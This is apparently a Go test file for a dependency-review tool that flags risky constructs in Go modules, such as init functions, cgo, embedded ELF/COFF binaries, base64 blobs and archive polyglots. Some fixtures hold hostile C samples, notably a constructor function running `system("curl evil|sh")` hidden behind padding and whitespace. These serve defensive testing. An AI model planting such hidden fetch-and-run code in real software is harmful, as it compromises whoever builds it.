package gomod

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"debug/elf"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/sadbox/dep-review/internal/eco/ecoutil"
	"github.com/sadbox/dep-review/internal/model"
)

// minimalELF is a small, well-formed ELF relocatable object: a symbol
// table, its string table and the section name table. The gate reads its
// structure to the end.
func minimalELF() []byte {
	shstr := []byte("\x00.symtab\x00.strtab\x00.shstrtab\x00")
	strtab := []byte("\x00start\x00")
	sym := make([]byte, 48)
	binary.LittleEndian.PutUint32(sym[24:], 1)
	off := 64
	symOff := off
	off += len(sym)
	strOff := off
	off += len(strtab)
	shOff := off
	off += len(shstr)
	var b bytes.Buffer
	h := elf.Header64{Type: uint16(elf.ET_REL), Machine: uint16(elf.EM_X86_64), Version: 1,
		Shoff: uint64(off), Ehsize: 64, Shentsize: 64, Shnum: 4, Shstrndx: 3}
	copy(h.Ident[:], "\x7fELF")
	h.Ident[elf.EI_CLASS] = byte(elf.ELFCLASS64)
	h.Ident[elf.EI_DATA] = byte(elf.ELFDATA2LSB)
	h.Ident[elf.EI_VERSION] = 1
	binary.Write(&b, binary.LittleEndian, h)
	b.Write(sym)
	b.Write(strtab)
	b.Write(shstr)
	for _, s := range []elf.Section64{{},
		{Name: 1, Type: uint32(elf.SHT_SYMTAB), Off: uint64(symOff), Size: uint64(len(sym)), Link: 2, Entsize: 24},
		{Name: 9, Type: uint32(elf.SHT_STRTAB), Off: uint64(strOff), Size: uint64(len(strtab))},
		{Name: 17, Type: uint32(elf.SHT_STRTAB), Off: uint64(shOff), Size: uint64(len(shstr))},
	} {
		binary.Write(&b, binary.LittleEndian, s)
	}
	return b.Bytes()
}

var (
	goELFOnce sync.Once
	goELF     []byte
	goELFErr  error
)

// builtGoELF is a real, statically linked Go program for linux/amd64,
// built once by the test.
func builtGoELF(t *testing.T) []byte {
	t.Helper()
	goELFOnce.Do(func() {
		dir, err := os.MkdirTemp("", "gomod-elf-")
		if err != nil {
			goELFErr = err
			return
		}
		defer os.RemoveAll(dir)
		os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module example.com/hello\n\ngo 1.21\n"), 0o644)
		os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n\nfunc main() { println(\"hello\") }\n"), 0o644)
		cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", "hello", ".")
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64", "CGO_ENABLED=0", "GOTOOLCHAIN=local", "GOFLAGS=")
		if out, err := cmd.CombinedOutput(); err != nil {
			goELFErr = fmt.Errorf("%v: %s", err, out)
			return
		}
		goELF, goELFErr = os.ReadFile(filepath.Join(dir, "hello"))
	})
	if goELFErr != nil {
		t.Fatalf("building the fixture: %v", goELFErr)
	}
	return goELF
}

func wrapped(b []byte) string {
	enc := base64.StdEncoding.EncodeToString(b)
	var w strings.Builder
	for i := 0; i < len(enc); i += 76 {
		w.WriteString(enc[i:min(i+76, len(enc))] + "\n")
	}
	return w.String()
}

// fileOf is the file a file-level item is about ("a.go (os/exec)" ->
// "a.go").
func fileOf(item string) string {
	f, _, _ := strings.Cut(item, " (")
	return f
}

// TestInvariantShownInFull: for every flagged code, an item may be on the
// review route only if the focused evidence shows it in full: the whole
// text of the file it is in, the whole declaration for init callees, a
// rendering read to its end for binaries and decoded blobs. Positive
// fixtures stay on the review route (so that route is reachable);
// negative ones go to a person.
func TestInvariantShownInFull(t *testing.T) {
	gen := "package p\n\n//go:generate echo hi\n"
	cases := []struct {
		name   string
		old    map[string]string
		cur    map[string]string
		code   string
		item   string
		review bool // must stay review-eligible
	}{
		{"init", nil, map[string]string{"a.go": "package p\n\nfunc init() { println(1) }\n"}, codeInit, "a.go", true},
		{"var initializer", nil, map[string]string{"a.go": "package p\n\nimport \"os\"\n\nvar x = os.Getenv(\"X\")\n"}, codeVarInit, "a.go", true},
		{"init callee",
			map[string]string{"a.go": "package p\n\nfunc init() { helper() }\n\nfunc helper() {}\n"},
			map[string]string{"a.go": "package p\n\nfunc init() { helper() }\n\nfunc helper() { println(2) }\n"}, codeInitCallee, "helper", true},
		{"blank import", nil, map[string]string{"a.go": "package p\n\nimport _ \"example.com/q\"\n"}, codeBlank, "a.go (example.com/q)", true},
		{"risky import", nil, map[string]string{"a.go": "package p\n\nimport \"os/exec\"\n\nvar _ = exec.Command\n"}, codeImport, "a.go (os/exec)", true},
		{"cgo", nil, map[string]string{"c.go": "package p\n\n// int f(void);\nimport \"C\"\n\nfunc G() { C.f() }\n"}, codeCgo, "c.go", true},
		{"linkname", nil, map[string]string{"l.go": "package p\n\nimport _ \"unsafe\"\n\n//go:linkname now runtime.nanotime\nfunc now() int64\n"}, codeLinkname, "l.go", true},
		{"go:generate", nil, map[string]string{"g.go": gen}, codeGenerate, "g.go", true},
		{"go:embed", nil, map[string]string{"e.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.txt\nvar s string\n", "x.txt": "x\n"}, codeEmbed, "e.go", true},
		{"C source", nil, map[string]string{"x.c": "int f(void) { return 1; }\n", "p.go": "package p\n"}, codeCSource, "x.c", true},
		{"C source with a NUL", nil, map[string]string{"x.c": "\x00int f(void) { system(\"id\"); }\n", "p.go": "package p\n"}, codeCSource, "x.c", true},
		{"assembly", nil, map[string]string{"x_amd64.s": "TEXT ·f(SB),0,$0\n\tRET\n", "p.go": "package p\n"}, codeAsm, "x_amd64.s", true},
		{"wrapped base64 of an ELF", nil, map[string]string{"b.go": "package p\n\nvar blob = `" + wrapped(minimalELF()) + "`\n"}, codeBlob, "b.go", false},
		{"blob of text", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("plain words, nothing encoded here.\n", 40))) + "\"\n"}, codeBlob, "b.go", true},
		// "ABC..." is itself valid base64: decoded again, to bytes nothing parses.
		{"blob of text that looks encoded", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD", 300) + "\"\n"}, codeBlob, "b.go", false},
		{"blob of DER bytes", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + base64.StdEncoding.EncodeToString(append([]byte{0x30, 0x82, 0x03, 0x00}, bytes.Repeat([]byte{0x02, 0x01, 0x00}, 300)...)) + "\"\n"}, codeBlob, "b.go", false},
		{"blob of text over the file cap", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD", 140<<10) + "\"\n"}, codeBlob, "b.go", false},
		{"blob no decoder reads", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD\\x01", 300) + "\"\n"}, codeBlob, "b.go", false},
		{"COFF .syso", nil, map[string]string{"w_windows_amd64.syso": string(coffObject(2, 64)), "p.go": "package p\n"}, codeBinary, "w_windows_amd64.syso", false},
		{"linked Go ELF .syso", nil, map[string]string{"g_linux_amd64.syso": "", "p.go": "package p\n"}, codeBinary, "g_linux_amd64.syso", false},
		{"embedded Go ELF", nil, map[string]string{"bin/tool": "", "e.go": "package p\n\nimport _ \"embed\"\n\n//go:embed bin/tool\nvar tool []byte\n"}, codeBinary, "bin/tool", false},
		{"truncated ELF .syso", nil, map[string]string{"x.syso": "\x7fELF\x02\x01\x01 truncated", "p.go": "package p\n"}, codeBinary, "x.syso", false},
		// Round 5: inert binaries. An image nothing parses stays on review
		// only while the gate proves it never reaches the build.
		{"inert PNG only a test mentions", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n", "p_test.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}, codeBinary, "fixtures/logo.png", false},
		{"PNG a non-test file mentions", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}, codeBinary, "fixtures/logo.png", false},
		{"PNG embedded by non-test code", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed fixtures/*.png\nvar logo []byte\n"}, codeBinary, "fixtures/logo.png", false},
		// Round 6: what reaches the build without being named.
		{"PNG in a cgo module", nil, map[string]string{"fixtures/logo.png": png, "p.go": cgoFile, "p_test.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}, codeBinary, "fixtures/logo.png", false},
		{"PNG beside an assembly file", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n", "x_amd64.s": "TEXT ·f(SB),0,$0\n\tRET\n"}, codeBinary, "fixtures/logo.png", false},
		{"archive linked by -L/-l", nil, map[string]string{"lib/libfoo.a": "!<arch>\nfoo", "p.go": cgoFile}, codeBinary, "lib/libfoo.a", false},
		{"testdata archive linked by -L/-l", nil, map[string]string{"testdata/libfoo.a": "!<arch>\nfoo", "p.go": cgoFile}, codeBinary, "testdata/libfoo.a", false},
		{"archive in a module without cgo", nil, map[string]string{"lib/libfoo.a": "!<arch>\nfoo", "p.go": "package p\n"}, codeBinary, "lib/libfoo.a", false},
		{"tab-separated //go:embed", nil, map[string]string{"x.bin": "\x7fELF\x02\x01\x01 truncated", "a.txt": "a\n", "p.go": "package p\n\nimport \"embed\"\n\n//go:embed a.txt\tx.bin\nvar F embed.FS\n"}, codeBinary, "x.bin", false},
		{"//go:embed in a binary-looking Go file", nil, map[string]string{"x.bin": "\x7fELF\x02\x01\x01 truncated", "p.go": "package p\n\nimport \"embed\"\n\n// " + strings.Repeat("\x01", 400) + "\n\n//go:embed *.bin\nvar F embed.FS\n"}, codeBinary, "x.bin", false},
		{"unchanged embedding file", map[string]string{"x.bin": "\x7fELF\x02\x01\x01 v1", "a.txt": "a\n", "p.go": "package p\n\nimport \"embed\"\n\n//go:embed a.txt\tx.bin\nvar F embed.FS\n"},
			map[string]string{"x.bin": "\x7fELF\x02\x01\x01 v2", "a.txt": "a\n", "p.go": "package p\n\nimport \"embed\"\n\n//go:embed a.txt\tx.bin\nvar F embed.FS\n"}, codeBinary, "x.bin", false},
		{"gzip of an unread ELF, embedded", nil, map[string]string{"x.gz": gz("\x7fELF\x02\x01\x01 truncated"), "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.gz\nvar b []byte\n"}, codeBinary, "x.gz", false},
		{"gzip of a complete ELF, embedded", nil, map[string]string{"x.gz": gz(string(minimalELF())), "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.gz\nvar b []byte\n"}, codeBinary, "x.gz", false},
		{"testdata PNG in a module without cgo", nil, map[string]string{"testdata/logo.png": png, "p.go": "package p\n", "a.go": "package p\n\nfunc init() {}\n"}, codeInit, "a.go", true},
		// Round 7: archives read in full, polyglots and case folding.
		{"embedded tar of regular members", nil, embedding("x.tar", archTar(tar.TypeReg, false)), codeBinary, "x.tar", false},
		{"embedded tar.gz of regular members", nil, embedding("x.tar.gz", gz(archTar(tar.TypeReg, false))), codeBinary, "x.tar.gz", false},
		{"embedded zip of regular members", nil, embedding("x.zip", archZip()), codeBinary, "x.zip", false},
		{"embedded tar with a contiguous member", nil, embedding("x.tar", archTar(tar.TypeCont, true)), codeBinary, "x.tar", false},
		{"embedded tar with junk after its end", nil, embedding("x.tar", archTar(tar.TypeReg, false)+"\x7fELF trailer"), codeBinary, "x.tar", false},
		{"embedded tar/zip polyglot", nil, embedding("x.tar", archTar(tar.TypeReg, false)+archZip()), codeBinary, "x.tar", false},
		{"COFF .syso that is also a tar", nil, map[string]string{"r_windows_amd64.syso": coffTar(), "p.go": "package p\n"}, codeBinary, "r_windows_amd64.syso", false},
		{"//go:embed in another case", map[string]string{"payload.bin": "\x00\x01 v1", "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed PAYLOAD.BIN\nvar b []byte\n"},
			map[string]string{"payload.bin": "\x00\x01 v2", "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed PAYLOAD.BIN\nvar b []byte\n"}, codeBinary, "payload.bin", false},
		{"testdata binary embedded in another case", nil, map[string]string{"testdata/x.bin": "\x00\x02 evil", "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed TESTDATA/X.BIN\nvar b []byte\n"}, codeBinary, "testdata/x.bin", false},
		{"nested text encoded in an unknown form", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + base64.StdEncoding.EncodeToString([]byte(strings.Repeat(`\x7f\x45\x4c\x46`, 200))) + "\"\n"}, codeBlob, "b.go", false},
		// Round 8: the allowlist.
		{"PNG beside a non-ASCII embed pattern", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed ſ.txt\nvar s string\n", "ſ.txt": "x\n"}, codeBinary, "fixtures/logo.png", false},
		{"testdata binary named _test.go, embedded", nil, map[string]string{"testdata/blob_test.go": "\x7fELF\x02\x01\x01\x00payload", "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/blob_test.go\nvar b []byte\n"}, codeBinary, "testdata/blob_test.go", false},
		{"COFF listing fewer sections than it has", nil, map[string]string{"x.syso": string(coffSections(5, 2)), "p.go": "package p\n"}, codeBinary, "x.syso", false},
	}
	elfBytes := builtGoELF(t)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for k, v := range tc.cur {
				if v == "" && strings.Contains(tc.name, "Go ELF") && (k == "g_linux_amd64.syso" || k == "bin/tool") {
					tc.cur[k] = string(elfBytes)
				}
			}
			var old = writeTreeOrNil(t, tc.old)
			h := CheckTrees(old, writeTree(t, tc.cur))
			if !slices.Contains(h.items(tc.code), tc.item) {
				t.Fatalf("%s %s not flagged (codes %q)", tc.code, tc.item, h.codes())
			}
			eligible := !slices.Contains(h.items(codeIncomplete), tc.code+" "+tc.item)
			if eligible != tc.review {
				t.Fatalf("review-eligible = %v, want %v; context:\n%.3000s", eligible, tc.review, strings.Join(h.ctx[tc.code][tc.item], ""))
			}
			if !eligible {
				return
			}
			// The invariant: what stays on review is shown in full.
			out := string(h.render("m"))
			ctx := strings.Join(h.ctx[tc.code][tc.item], "")
			switch tc.code {
			case codeInitCallee:
				if !strings.Contains(ctx, "new declaration (a.go:5):\n    | func helper() { println(2) }\n") {
					t.Errorf("declaration not shown whole:\n%s", ctx)
				}
			case codeBinary:
				// Round 9: binaries are never review-eligible.
				t.Errorf("a binary is on the review route:\n%s", ctx)
			default:
				f := fileOf(tc.item)
				if !strings.Contains(out, quote("full text of the new version of "+f, tc.cur[f])) {
					t.Errorf("the full text of %s is not in the focused evidence:\n%.3000s", f, out)
				}
				if tc.code == codeBlob && !strings.Contains(ctx, "the decoded text, in full") {
					t.Errorf("blob on review without its decoded text in full:\n%s", ctx)
				}
			}
		})
	}
}

const png = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

const cgoFile = "package p\n\n/*\n#cgo LDFLAGS: -L${SRCDIR}/lib -L${SRCDIR}/testdata -lfoo\nint evil(void);\n*/\nimport \"C\"\n\nfunc F() int { return int(C.evil()) }\n"

// embedding is a module whose non-test code embeds name (so it is never
// "no way to the build": only a complete rendering keeps it on review).
func embedding(name, data string) map[string]string {
	return map[string]string{name: data, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed " + name + "\nvar b []byte\n"}
}

// archTar is a tar of a text member and a minimal ELF member of type flag
// (with an unread ELF when broken).
func archTar(flag byte, broken bool) string {
	elfData := minimalELF()
	if broken {
		elfData = []byte("\x7fELF\x02\x01\x01 truncated")
	}
	var b bytes.Buffer
	tw := tar.NewWriter(&b)
	tw.WriteHeader(&tar.Header{Name: "README", Typeflag: tar.TypeReg, Size: 6, Mode: 0o644, Format: tar.FormatUSTAR})
	tw.Write([]byte("hello\n"))
	tw.WriteHeader(&tar.Header{Name: "bin/tool.o", Typeflag: flag, Size: int64(len(elfData)), Mode: 0o755, Format: tar.FormatUSTAR})
	tw.Write(elfData)
	tw.Close()
	return b.String()
}

func archZip() string {
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	w, _ := zw.Create("README.txt")
	w.Write([]byte("hello\n"))
	w, _ = zw.Create("bin/tool.o")
	w.Write(minimalELF())
	zw.Close()
	return b.String()
}

// coffTar is a COFF object whose first 512 bytes are also a tar header.
func coffTar() string {
	b := []byte(r6SysoTar([]byte("resource payload")))
	return string(b)
}

func gz(s string) string {
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	w.Write([]byte(s))
	w.Close()
	return b.String()
}

func writeTreeOrNil(t *testing.T, files map[string]string) *ecoutil.Tree {
	if files == nil {
		return nil
	}
	return writeTree(t, files)
}

// coffSections is a COFF object whose header claims nsec sections while
// only have are present before the end of the file.
func coffSections(nsec, have int) []byte {
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, struct {
		Machine, NSec     uint16
		Time, Ptr, NSym   uint32
		OptSize, Characts uint16
	}{0x8664, uint16(nsec), 0, 0, 0, 0, 0})
	for i := range have {
		var sec [40]byte
		copy(sec[:], fmt.Sprintf(".s%d", i))
		b.Write(sec[:])
	}
	return b.Bytes()
}

// TestCompiledSourceNeverBinary (round 4, H1; the review's
// TestZZNulCSource): a C file with a NUL is quoted in full, the NUL shown
// as an escape, and the payload past any strings cap is there.
func TestCompiledSourceNeverBinary(t *testing.T) {
	var src strings.Builder
	src.WriteString("\x00/* x */\n")
	for i := range 310 {
		fmt.Fprintf(&src, "static int pad%03d = %d;\n", i, i)
	}
	src.WriteString(strings.Repeat(" ", 170) + "__attribute__((constructor)) static void e(void){system(\"curl evil|sh\");}\n")
	h := CheckTrees(nil, writeTree(t, map[string]string{"evil.c": src.String(), "p.go": "package p\n"}))
	out := string(h.render("m"))
	if !strings.Contains(out, "static void e(void){system(\"curl evil|sh\");}") || !strings.Contains(out, "    | <0x00>/* x */\n") {
		t.Errorf("compiled C source with a NUL is not quoted in full:\n%.2000s", out)
	}
	if strings.Contains(out, "the gate's rendering of evil.c") {
		t.Errorf("a compiled source took the binary path")
	}
}

// TestSamePlaceholderDistinctFiles (round 4, M1): two raw paths behind one
// item id keep their own texts and numbers, and the item shows both.
func TestSamePlaceholderDistinctFiles(t *testing.T) {
	h := newReport()
	const id = "<invalid-path:000000000000000000000000>"
	h.add(codeCSource, id, true, h.fileRef("é1.c", []byte("__attribute__((constructor)) static void e(void){system(\"x\");}\n")))
	h.add(codeCSource, id, true, h.fileRef("é2.c", []byte("int benign(void) { return 0; }\n")))
	out := string(h.render("m"))
	for _, want := range []string{"system(\"x\")", "int benign(void)", "### file 1: ", "### file 2: ",
		"full text: see \"### file 1\" below", "full text: see \"### file 2\" below"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if a, b := safeFile("é1.c"), safeFile("é2.c"); a == b {
		t.Errorf("placeholders collide: %s", a)
	} else if len(a) != len("<invalid-path:>")+24 {
		t.Errorf("placeholder %q does not carry 12 hash bytes", a)
	}
}

// TestWrappedAndEscapedBlobs (round 4, M2; the review's TestZZWrappedBase64).
func TestWrappedAndEscapedBlobs(t *testing.T) {
	// Round 8: both are rendered (for the person deciding) and go to a
	// person; decoded bytes that are not text are never cleared.
	h := CheckTrees(nil, writeTree(t, map[string]string{"p.go": "package p\n\nvar blob = `" + wrapped(minimalELF()) + "`\n"}))
	if ctx := strings.Join(h.ctx[codeBlob]["p.go"], ""); !strings.Contains(ctx, "type: ELF") || len(h.items(codeIncomplete)) != 1 {
		t.Errorf("wrapped base64 of an ELF: incomplete %q\n%.2000s", h.items(codeIncomplete), ctx)
	}
	var e strings.Builder
	for _, c := range minimalELF() {
		fmt.Fprintf(&e, `\x%02x`, c)
	}
	h = CheckTrees(nil, writeTree(t, map[string]string{"q.go": "package p\n\nvar b = \"" + e.String() + "\"\n"}))
	ctx := strings.Join(h.ctx[codeBlob]["q.go"], "")
	if !strings.Contains(ctx, "its bytes are binary as written") || !strings.Contains(ctx, "type: ELF") || len(h.items(codeIncomplete)) != 1 {
		t.Errorf("escaped ELF literal: incomplete %q\n%.2000s", h.items(codeIncomplete), ctx)
	}
	_ = model.MaxFlagged
}
